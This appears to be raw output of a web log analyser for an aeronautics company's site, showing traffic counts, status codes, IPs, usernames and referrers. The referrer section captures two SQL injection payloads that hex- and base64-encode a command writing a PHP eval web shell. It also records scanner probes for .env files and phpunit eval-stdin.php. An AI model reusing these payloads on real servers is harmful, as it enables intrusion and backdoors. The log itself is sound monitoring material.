r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	625591	43.756	.jpg  [JPEG graphics]
t	lRb	1	472746	26.229	.html [Hypertext Markup Language]
t	lRb	1	428267	18.517	[directories]
t	lRb	1	5723	5.242	.mp4
t	lRb	1	778	2.157	.wmv
t	lRb	1	87	2.118	.mpg  [MPEG movie]
t	lRb	1	18734	0.911	.asp  [Active Server REQUESTS]
t	lRb	1	79464	0.296	.gif  [GIF graphics]
t	lRb	1	172633	0.254	.js  [JavaScript code]
t	lRb	1	88379	0.225	.css  [Cascading Style Sheets]
t	lRb	1	6147	0.210	.pdf  [Adobe Portable Document Format]
t	lRb	1	34790	0.084	[not listed: 6]
z	*FR	2023	04	05	20	41
z	*LR	2023	05	09	10	03
z	ScR	0	0.000	84837	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	0	0.000	85122	101b-  1kb
z	ScR	0	0.000	509907	1kb- 10kb
z	ScR	0	0.000	352085	10kb-100kb
z	ScR	0	0.000	104639	100kb-  1Mb
z	ScR	0	0.000	4584	1Mb- 10Mb
z	ScR	0	0.000	55	10Mb-100Mb
z	ScR	0	0.000	13	100Mb-  1Gb
c	*FR	2014	03	02	13	52
c	*LR	2024	05	28	04	55
c	*f	0R	a
c	R	1816122	200 OK
c	R	9178	206 Partial content
c	R	177	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	108039	304 Not modified since last retrieval
c	R	1332	400 Bad request
c	R	207	401 Authentication required
c	R	681	403 Access forbidden
c	R	759750	404 Document not found
c	R	2593	405 Method not allowed
c	R	1114	406 Document not acceptable to client
c	R	141	416 Requested range not valid
c	R	624	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2024	05	28	04	55
I	*f	-30S	s
I	lRS	1	174271	182	/robots.txt
I	lRS	1	9268	20	/ads.txt
I	lRS	1	3314	12	/index.php
I	lRS	1	117	10	/h5/
I	lRS	1	2272	8	/plus/mytag_js.php
I	lRS	1	4980	8	/xmlrpc.php
I	lRS	1	917	5	/new
I	lRS	1	930	5	/old
I	lRS	1	9252	5	/wp-login.php
I	lRS	1	587	5	/plus/download.php
I	lRS	1	939	5	/wp
I	lRS	1	997	5	/wordpress
I	lRS	1	700	5	/home
I	lRS	1	3777	5	/.env
I	lRS	1	1380	4	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	1324	4	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	1207	4	/2019/wp-includes/wlwmanifest.xml
I	lRS	1	1429	4	/wp-includes/wlwmanifest.xml
I	lRS	1	774	4	/2018/wp-includes/wlwmanifest.xml
I	lRS	1	1384	4	/web/wp-includes/wlwmanifest.xml
I	lRS	1	1145	4	/sito/wp-includes/wlwmanifest.xml
I	lRS	1	1524	4	/blog/wp-includes/wlwmanifest.xml
I	lRS	1	153	4	/app/.env
I	lRS	1	1147	4	/website/wp-includes/wlwmanifest.xml
I	lRS	1	1141	4	/news/wp-includes/wlwmanifest.xml
I	lRS	1	1523	4	/wordpress/wp-includes/wlwmanifest.xml
I	lRS	1	1518	4	/wp/wp-includes/wlwmanifest.xml
I	lRS	1	771	4	/media/wp-includes/wlwmanifest.xml
I	lRS	1	1521	4	/cms/wp-includes/wlwmanifest.xml
I	lRS	1	1148	4	/wp2/wp-includes/wlwmanifest.xml
I	lRS	1	534997	1190	[not listed: 29887]
L	*FR	2007	12	11	00	52
L	*LR	2024	05	28	04	55
L	*f	-20S	s
L	RS	1335	445	193.141.60.143
L	RS	304	304	39.173.76.3
L	RS	1494	249	172.171.225.108
L	RS	52	52	209.141.47.98
L	RS	84	38	81.19.135.59
L	RS	72	36	5.189.177.53
L	RS	504	24	91.92.243.138
L	RS	4791	19	216.244.66.229
L	RS	36	18	38.68.135.181
L	RS	90	18	89.149.39.6
L	RS	66	11	157.66.48.185
L	RS	60	10	185.97.106.139
L	RS	725	10	66.249.66.195
L	RS	570	9	194.38.23.16
L	RS	18	9	45.77.79.3
L	RS	18	9	45.77.206.251
L	RS	9	9	144.202.17.145
L	RS	235	7	207.46.13.229
L	RS	566	7	66.249.66.73
L	RS	18	6	149.56.150.232
L	RS	755523	244	[not listed: 86985]
K	*FR	2013	12	22	04	20
K	*LR	2024	05	27	22	31
K	*f	-30S	s
K	lRS	1	21501	304	http://www.gtaeronautics.com/
K	lRS	1	630	9	http://www.gtaeronautics.com//index.php
K	lRS	1	1653	8	http://www.gtaeronautics.com//plus/mytag_js.php
K	lRS	1	250	5	http://www.gtaeronautics.com//plus/download.php
K	lRS	1	4	3	http://www.gtaeronautics.com//plus/erraddsave.php
K	lRS	1	332	3	http://www.gtaeronautics.com//plus/ad_js.php
K	lRS	1	10	2	https://t.me/bads_community
K	lRS	1	70	1	http://www.gtaeronautics.com//plus/myjs.php
K	lRS	1	54	1	http://www.gtaeronautics.com//lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	70	1	http://www.gtaeronautics.com//robots.php
K	lRS	1	260	1	554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/+union+select+1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10--+-";s:2:"id";s:3:"'/*";}
K	lRS	1	95	1	http://www.gtaeronautics.com//robots1.php
K	lRS	1	887	1	http://www.gtaeronautics.com//
K	lRS	1	71	1	http://www.gtaeronautics.com//install/index.php.bak
K	lRS	1	65	1	http://www.gtaeronautics.com//type.php
K	lRS	1	72	1	http://www.gtaeronautics.com//12345.php
K	lRS	1	54	1	http://www.gtaeronautics.com//zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	57	1	http://www.gtaeronautics.com//plus/digg_ajax.php
K	lRS	1	65	1	http://www.gtaeronautics.com//nuan.php
K	lRS	1	135	1	http://www.gtaeronautics.com//x.php
K	lRS	1	54	1	http://www.gtaeronautics.com//yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	67	1	http://www.gtaeronautics.com//utility/convert/index.php
K	lRS	1	54	1	http://www.gtaeronautics.com//laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	57	1	http://www.gtaeronautics.com//include/dialog/select_images_post.php
K	lRS	1	57	1	http://www.gtaeronautics.com//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	143	1	http://www.gtaeronautics.com//plus/laobiao.php
K	lRS	1	54	1	http://www.gtaeronautics.com//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	68	1	http://www.gtaeronautics.com//data/cache/t.php
K	lRS	1	256	1	45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:297:"*/SELECT+1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A336C7A655846784C6E426F634363734A7A772F63476877494756325957776F4A46395154314E5557336C7A655630704F79412F506963702729293B2F2F7D787878,10--+-";s:2:"id";s:11:"-1'+UNION/*";}45ea207d7a2b68c49582d2d22adf953a
K	lRS	1	57	1	http://www.gtaeronautics.com//plus/comments_frame.php
K	lRS	1	52298	2	[not listed: 6120]
E	*FR	2008	01	06	10	12
E	*LR	2024	02	09	03	06
E	*f	-30S	s
E	lSR	1	0	254	[not listed: 7]
l	*FR	2008	01	06	10	12
l	*LR	2024	02	09	03	06
l	*f	-20S	s
l	SR	0	254	[not listed: 116]
v	*f	-20B	b
v	Rb	1275924	65.103	64.41.87.40
v	Rb	657415	34.897	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2024	02	09	03	06
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	76	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2024	05	28	04	55
M	*f	-20R	r
M	R	463964	64.41.87.40
M	R	302606	66.113.131.59
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2024	04	10	09	30
P	*LR	2024	05	28	04	37
P	R	230	0
P	R	234	<= 0.01
P	R	2477	0.01-0.02
P	R	161528	0.02-0.05
P	R	214334	0.05-0.1 
P	R	283053	0.1 -0.2 
P	R	285541	0.2 -0.5 
P	R	146792	0.5 -1   
P	R	81330	1-  2 
P	R	34211	2-  5 
P	R	14397	5- 10 
P	R	7146	10- 20 
P	R	24473	20- 60 
P	R	3772	60-120 
P	R	16350	120-300 
